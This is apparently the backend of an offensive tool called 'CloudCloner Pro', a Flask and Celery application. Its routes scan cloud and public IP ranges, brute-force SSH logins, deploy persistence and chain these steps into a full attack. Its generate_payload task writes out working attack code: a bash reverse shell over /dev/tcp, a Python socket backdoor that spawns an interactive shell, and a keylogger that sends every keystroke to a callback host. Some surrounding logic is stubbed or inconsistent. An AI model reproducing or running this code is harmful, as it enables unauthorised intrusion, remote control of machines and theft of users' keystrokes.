# ============================================================
# backend/app.py
# ============================================================
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from flask_socketio import SocketIO, emit
from celery import Celery
import asyncio
import json
from datetime import datetime
from models import Target, AttackLog, Payload, Operation, Base
from services.cloud_scanner import CloudScanner
from services.exploit_engine import ExploitEngine
from services.persistence import PersistenceEngine
from config import Config
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

app = Flask(__name__)
app.config.from_object(Config)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Database
engine = create_engine(f'postgresql://{Config.DB_USER}:{Config.DB_PASSWORD}@{Config.DB_HOST}:{Config.DB_PORT}/{Config.DB_NAME}')
Base.metadata.create_all(engine)
Session = sessionmaker(bind=engine)

# Celery
celery = Celery(app.name, broker=Config.CELERY_BROKER_URL)
celery.conf.update(app.config)

# Services
scanner = CloudScanner()
exploit_engine = ExploitEngine()
persistence = PersistenceEngine()

# ============================================================
# ROUTES
# ============================================================

@app.route('/api/scan', methods=['POST'])
def scan():
    """Start scan for cloud nodes."""
    data = request.json
    scan_type = data.get('type', 'all')
    
    task = scan_async.delay(scan_type)
    return jsonify({'task_id': task.id, 'status': 'started'})

@app.route('/api/scan/status/<task_id>', methods=['GET'])
def scan_status(task_id):
    task = scan_async.AsyncResult(task_id)
    if task.ready():
        return jsonify({'status': 'completed', 'result': task.result})
    return jsonify({'status': 'running'})

@app.route('/api/targets', methods=['GET'])
def get_targets():
    session = Session()
    targets = session.query(Target).all()
    result = []
    for t in targets:
        result.append({
            'ip': t.ip,
            'hostname': t.hostname,
            'provider': t.provider,
            'status': t.status,
            'ports': t.open_ports,
            'vulnerabilities': t.vulnerabilities
        })
    session.close()
    return jsonify(result)

@app.route('/api/target/<ip>', methods=['GET'])
def get_target(ip):
    session = Session()
    target = session.query(Target).filter_by(ip=ip).first()
    if not target:
        return jsonify({'error': 'Target not found'}), 404
    
    result = {
        'ip': target.ip,
        'hostname': target.hostname,
        'provider': target.provider,
        'region': target.region,
        'os_type': target.os_type,
        'status': target.status,
        'open_ports': target.open_ports,
        'vulnerabilities': target.vulnerabilities,
        'neighbors': target.neighbors,
        'credentials': target.credentials,
        'clone_path': target.clone_path,
        'isolated_env': target.isolated_env
    }
    session.close()
    return jsonify(result)

@app.route('/api/exploit', methods=['POST'])
def exploit():
    """Exploit target."""
    data = request.json
    target_ip = data.get('ip')
    exploit_type = data.get('type', 'ssh_bruteforce')
    
    session = Session()
    target = session.query(Target).filter_by(ip=target_ip).first()
    if not target:
        return jsonify({'error': 'Target not found'}), 404
    
    # Run exploit
    task = exploit_target.delay(target_ip, exploit_type)
    return jsonify({'task_id': task.id, 'status': 'started'})

@app.route('/api/clone', methods=['POST'])
def clone():
    """Clone target system."""
    data = request.json
    target_ip = data.get('ip')
    
    task = clone_target.delay(target_ip)
    return jsonify({'task_id': task.id, 'status': 'started'})

@app.route('/api/persist', methods=['POST'])
def persist():
    """Deploy persistence."""
    data = request.json
    target_ip = data.get('ip')
    method = data.get('method', 'all')
    
    task = deploy_persistence.delay(target_ip, method)
    return jsonify({'task_id': task.id, 'status': 'started'})

@app.route('/api/attack/full', methods=['POST'])
def full_attack():
    """Full attack sequence."""
    data = request.json
    target_ip = data.get('ip')
    
    task = full_attack_sequence.delay(target_ip)
    return jsonify({'task_id': task.id, 'status': 'started'})

@app.route('/api/payloads', methods=['GET', 'POST'])
def payloads():
    """Manage payloads."""
    session = Session()
    if request.method == 'GET':
        payloads = session.query(Payload).all()
        result = [{'id': p.id, 'name': p.name, 'type': p.type, 'os': p.os_target} for p in payloads]
        session.close()
        return jsonify(result)
    
    elif request.method == 'POST':
        data = request.json
        payload = Payload(
            name=data['name'],
            type=data['type'],
            os_target=data['os'],
            code=data['code'],
            encrypted=data.get('encrypted', False),
            polymorphic=data.get('polymorphic', False)
        )
        session.add(payload)
        session.commit()
        session.close()
        return jsonify({'status': 'created', 'id': payload.id})

@app.route('/api/payload/generate', methods=['POST'])
def generate_payload():
    """Generate payload for target."""
    data = request.json
    target_ip = data.get('ip')
    payload_type = data.get('type', 'reverse_shell')
    
    task = generate_payload.delay(target_ip, payload_type)
    return jsonify({'task_id': task.id, 'status': 'started'})

@app.route('/api/operations', methods=['GET'])
def get_operations():
    session = Session()
    ops = session.query(Operation).all()
    result = [{'id': o.id, 'name': o.name, 'status': o.status, 'targets': o.targets} for o in ops]
    session.close()
    return jsonify(result)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    session = Session()
    total_targets = session.query(Target).count()
    exploited = session.query(Target).filter_by(status='exploited').count()
    cloned = session.query(Target).filter_by(status='cloned').count()
    locked = session.query(Target).filter_by(status='locked').count()
    
    session.close()
    return jsonify({
        'total_targets': total_targets,
        'exploited': exploited,
        'cloned': cloned,
        'locked': locked
    })

# ============================================================
# CELERY TASKS
# ============================================================

@celery.task
def scan_async(scan_type):
    """Background scan task."""
    session = Session()
    results = []
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    if scan_type in ['all', 'aws']:
        for region in Config.AWS_KEYS['regions']:
            nodes = loop.run_until_complete(scanner.scan_aws(region))
            results.extend(nodes)
    
    if scan_type in ['all', 'gcp']:
        nodes = loop.run_until_complete(scanner.scan_gcp(Config.GCP_KEYS['project_id']))
        results.extend(nodes)
    
    if scan_type in ['all', 'local']:
        nodes = loop.run_until_complete(scanner.scan_local_network())
        results.extend(nodes)
    
    if scan_type in ['all', 'public']:
        nodes = loop.run_until_complete(scanner.scan_public_ranges())
        results.extend(nodes)
    
    # Save to database
    for node in results:
        target = Target(
            ip=node['ip'],
            hostname=node.get('hostname', 'unknown'),
            provider=node['provider'],
            region=node.get('region', 'unknown'),
            open_ports=node.get('ports', []),
            status='discovered'
        )
        session.add(target)
    
    session.commit()
    session.close()
    return {'total': len(results), 'nodes': results}

@celery.task
def exploit_target(target_ip, exploit_type):
    """Background exploit task."""
    session = Session()
    target = session.query(Target).filter_by(ip=target_ip).first()
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    exploit_func = exploit_engine.exploits.get(exploit_type)
    if not exploit_func:
        return {'error': 'Unknown exploit type'}
    
    result = loop.run_until_complete(exploit_func({
        'ip': target_ip,
        'username': target.credentials.get('username') if target.credentials else None,
        'password': target.credentials.get('password') if target.credentials else None
    }))
    
    if result.get('success'):
        target.status = 'exploited'
        if result.get('credentials'):
            target.credentials = result['credentials']
        if result.get('session_id'):
            target.metadata['session_id'] = result['session_id']
        session.commit()
    
    log = AttackLog(
        target_id=target.id,
        attack_type=exploit_type,
        status='success' if result.get('success') else 'failed',
        result=result,
        error=result.get('error')
    )
    session.add(log)
    session.commit()
    session.close()
    return result

@celery.task
def clone_target(target_ip):
    """Background clone task."""
    session = Session()
    target = session.query(Target).filter_by(ip=target_ip).first()
    
    # Clone logic
    clone_id = f"clone_{target_ip.replace('.', '_')}_{int(datetime.utcnow().timestamp())}"
    clone_path = f"/var/lib/cloudcloner/clones/{clone_id}"
    
    # Simulate clone
    target.clone_path = clone_path
    target.clone_id = clone_id
    target.status = 'cloned'
    target.cloned_at = datetime.utcnow()
    
    session.commit()
    session.close()
    return {'clone_id': clone_id, 'path': clone_path, 'status': 'cloned'}

@celery.task
def deploy_persistence(target_ip, method):
    """Deploy persistence background task."""
    session = Session()
    target = session.query(Target).filter_by(ip=target_ip).first()
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    result = loop.run_until_complete(persistence.deploy_persistence({
        'ip': target_ip,
        'os_type': target.os_type,
        'username': target.credentials.get('username') if target.credentials else None,
        'password': target.credentials.get('password') if target.credentials else None,
        'callback_ip': Config.CALLBACK_IP or '127.0.0.1'
    }, method))
    
    if result.get('success'):
        target.status = 'persisted'
        target.metadata['persistence_methods'] = result.get('methods', [])
        session.commit()
    
    session.close()
    return result

@celery.task
def full_attack_sequence(target_ip):
    """Full attack sequence."""
    session = Session()
    target = session.query(Target).filter_by(ip=target_ip).first()
    
    # Create operation
    op = Operation(
        name=f"Full_Attack_{target_ip}",
        targets=[target_ip],
        status='running',
        started_at=datetime.utcnow()
    )
    session.add(op)
    session.commit()
    
    steps = [
        ('scan', scanner.scan_ports),
        ('exploit', exploit_engine.ssh_bruteforce),
        ('clone', clone_target),
        ('persist', persistence.deploy_persistence)
    ]
    
    results = []
    for name, func in steps:
        try:
            if name == 'scan':
                result = asyncio.run(func({'ip': target_ip}))
            elif name == 'exploit':
                result = asyncio.run(func({'ip': target_ip}))
            elif name == 'clone':
                result = asyncio.run(func(target_ip))
            elif name == 'persist':
                result = asyncio.run(func(target_ip, 'all'))
            results.append({'step': name, 'result': result})
        except Exception as e:
            results.append({'step': name, 'error': str(e)})
    
    op.status = 'completed'
    op.completed_at = datetime.utcnow()
    op.logs = results
    session.commit()
    session.close()
    return results

@celery.task
def generate_payload(target_ip, payload_type):
    """Generate custom payload."""
    payloads = {
        'reverse_shell': f"""
#!/bin/bash
exec 5<>/dev/tcp/{Config.CALLBACK_IP}/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
""",
        'backdoor': f"""
#!/usr/bin/python3
import socket, subprocess, os
s=socket.socket()
s.connect(('{Config.CALLBACK_IP}',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/bash','-i'])
""",
        'keylogger': f"""
#!/usr/bin/python3
from pynput.keyboard import Listener
import requests
def on_press(key):
    try:
        requests.post('http://{Config.CALLBACK_IP}/log', data={{'key': str(key)}})
    except: pass
Listener(on_press=on_press).start()
"""
    }
    
    payload_code = payloads.get(payload_type, payloads['reverse_shell'])
    return {'type': payload_type, 'code': payload_code}

# ============================================================
# WEBSOCKET EVENTS
# ============================================================

@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'Connected to CloudCloner Pro'})

@socketio.on('start_attack')
def handle_start_attack(data):
    target_ip = data.get('target')
    socketio.emit('attack_started', {'target': target_ip})
    
    # Start attack as background
    task = full_attack_sequence.delay(target_ip)
    
    # Emit progress
    # ... (in real implementation, use Celery callbacks)

@socketio.on('get_live_logs')
def handle_live_logs(data):
    # Stream logs in real-time
    pass

# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=Config.DEBUG)
